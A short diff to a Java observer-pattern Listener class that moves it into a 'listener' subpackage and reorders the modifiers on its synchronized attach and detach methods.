@@ -5,7 +5,7 @@
  * Created   : 20-apr-2011
  **********************************************/
 
-package com.ht.RCSAndroidGUI;
+package com.ht.RCSAndroidGUI.listener;
 
 import java.util.Iterator;
 import java.util.Stack;
@@ -23,7 +23,7 @@ public abstract class Listener<U> {
 		observers = new Stack<Observer<U>>();
 	}
 
-	synchronized public boolean attach(Observer<U> o) {
+	public synchronized boolean attach(Observer<U> o) {
 		// Object already in the stack
 		if (observers.search(o) != -1)
 			return false;
@@ -36,7 +36,7 @@ public abstract class Listener<U> {
 		return true;
 	}
 
-	synchronized public void detach(Observer<U> o) {
+	public synchronized void detach(Observer<U> o) {
 		if (observers.empty())
 			return;
 
